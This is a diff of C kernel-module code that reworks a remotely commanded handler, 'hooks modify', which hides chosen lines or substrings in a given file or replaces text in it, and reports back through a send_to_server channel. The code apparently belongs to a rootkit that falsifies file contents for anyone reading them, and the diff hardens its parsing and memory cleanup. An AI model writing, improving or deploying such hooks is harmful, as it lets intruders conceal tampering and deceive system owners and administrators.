@@ -170,59 +170,96 @@ static int list_alterate_handler(char *args, enum Protocol protocol) {
 }
 
 static int modify_file_handler(char *args, enum Protocol protocol) {
-    // Parameters
     char *path;
+    int ret = 0;
     long hide_line = -1;
     char *hide_substr = NULL;
     char *replace_src = NULL;
     char *replace_dst = NULL;
 
     // Parsing
-    char *token, *pair;
+    char *token;
 
     // Get the first token
     path = strsep(&args, " ");
     if (!path || path[0] != '/') {
-        send_to_server(protocol, "Usage: modify /full/path [hide_line=N] [hide_substr=TXT] [replace=SRC:DST]\n");
+        send_to_server(protocol, "Usage: hooks modify /full/path [hide_line=N] [hide_substr=TXT] [replace=SRC:DST]\n");
         return -EINVAL;
     }
 
     while (args && *args) {
         token = strsep(&args, " ");
+        if (!token || *token == '\0')
+            continue;
+
         if (strncmp(token, "hide_line=", 10) == 0) {
-            hide_line = simple_strtol(token + 10, NULL, 10);
+            char *num = token + 10;
+
+            if (*num != '\0')
+                hide_line = simple_strtol(num, NULL, 10);
         }
+        
         else if (strncmp(token, "hide_substr=", 12) == 0) {
-            hide_substr = kstrdup(token + 12, GFP_KERNEL);
-            if (!hide_substr)
-                return -ENOMEM;
+            char *txt = token + 12;
+            if (*txt == '\0') {
+                send_to_server(protocol, "Usage: hide_substr=TXT (TXT empty)\n");
+                ret = -EINVAL;
+                goto cleanup;
+            }
+            hide_substr = kstrdup(txt, GFP_KERNEL);
+            if (!hide_substr) {
+                ret = -ENOMEM;
+                goto cleanup;
+            }
         }
+
         else if (strncmp(token, "replace=", 8) == 0) {
-            pair = token + 8;
+            char *arg = token + 8;
+            char *colon = strchr(arg, ':');
 
-            char *src_tok = strsep(&pair, ":");
-            if (!pair) {
-                send_to_server(protocol, "Usage: replace=SRC:DST\n");
-                return -EINVAL;
+            if (!colon || colon == arg || *(colon + 1) == '\0') {
+                send_to_server(protocol, "Usage: replace=SRC:DST (SRC and/or DST empty, without spaces)\n");
+                ret = -EINVAL;
+                goto cleanup;
             }
 
-            replace_src = kstrdup(src_tok, GFP_KERNEL);
-            if (!replace_src)
-                return -ENOMEM;
+            *colon = '\0';
+            colon++;
 
-            replace_dst = kstrdup(pair, GFP_KERNEL);
+            replace_src = kstrdup(arg, GFP_KERNEL);
+            if (!replace_src) {
+                ret = -ENOMEM;
+                goto cleanup;
+            }
+
+            replace_dst = kstrdup(colon, GFP_KERNEL);
             if (!replace_dst) {
-                kfree(replace_src);
-                return -ENOMEM;
+                ret = -ENOMEM;
+                goto cleanup;
             }
+        }
+        else {
+            send_to_server(protocol,"Usage: hooks modify /full/path [hide_line=N] [hide_substr=TXT] [replace=SRC:DST]\n");
+            ret = -EINVAL;
+            goto cleanup;
         }
     }
 
-    if (alterate_add(path, hide_line, hide_substr, replace_src, replace_dst) > 0)
-        send_to_server(protocol, "Modified: %s\n", path);
+    // DEBUG
+    DBG_MSG("modify_file_handler: path='%s', hide_line=%ld, hide_substr='%s', replace_src='%s', replace_dst='%s'\n",
+        path, hide_line, hide_substr ? hide_substr : "NULL", replace_src ? replace_src : "NULL", replace_dst ? replace_dst : "NULL");
+
+    ret = alterate_add(path, hide_line, hide_substr, replace_src, replace_dst);
+    if (ret >= 0)
+        send_to_server(protocol, "Modified successfully: %s\n", path);
     else
         send_to_server(protocol, "Error modifying %s\n", path);
-    return 0;
+
+cleanup:
+    kfree(hide_substr);
+    kfree(replace_src);
+    kfree(replace_dst);
+    return ret >= 0 ? 0 : ret;
 }
 
 static int unmodify_file_handler(char *args, enum Protocol protocol) {
